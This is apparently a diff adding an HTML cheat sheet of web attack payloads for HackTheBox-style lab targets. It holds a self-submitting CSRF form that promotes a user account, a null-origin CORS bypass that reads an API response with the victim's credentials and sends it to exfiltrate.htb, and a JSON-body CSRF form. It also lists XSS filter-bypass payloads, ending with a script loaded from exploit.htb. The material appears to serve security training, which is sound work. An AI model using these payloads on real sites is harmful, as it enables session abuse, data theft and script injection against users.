@@ -1,0 +1,54 @@
+<!--Simple XSRF PoC-->
+<html>
+    <body>
+        <form method="GET" action="http://csrf.vulnerablesite.htb/profile.php">
+        <input type="hidden" name="promote" value="htb-stdt"/>
+        <input type="submit" value="Submit request"/>
+        </form>
+        <script>
+            document.form[0].submit();
+        </script>
+    </body>
+</html>
+
+<!--NULL Origin Misconfiguration Bypass-->
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'http://api.vulnerablesite.htb/data', true);
+xhr.withCredentials = true;
+xhr.onload = () => {
+location = 'http://exfiltrate.htb/log?data=' + btoa(xhr.response);
+};
+xhr.send();
+</script>"></iframe>
+
+<!--JSON Sorğu Gövdəsi ilə CSRF-->
+<form method="POST" action="http://csrf.vulnerablesite.htb/profile.php" enctype="text/plain">
+    <input type="hidden" name="{'promote': 'htb-std', 'dummykey" value="': 'dummyvalue}'">
+</form>
+
+<!--JXSS Filter BypassesF-->
+<!--Achieving JavaScript Execution-->
+
+<!--1.Script Tag-->
+<script>alert(1)</script>
+
+<!--2.Pseudo Protocols-->
+<a href="javascript:alert(1)">click</a>
+<object data="javascript:alert(1)">
+<object data="data:text/html,<script>alert(1)</script>">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+
+<!--3.Event Handlers-->
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+
+<!--Bypassing Blacklists-->
+<ScRiPt>alert(1);</ScRiPt>
+<object data="JaVaScRiPt:alert(1)">
+<img src=x OnErRoR=alert(1)>
+
+<scr<script>ipt>alert(1);</scr<script>ipt>
+
+<svg/onload=alert(1)>
+<script/src="http://exploit.htb/exploit"></script>
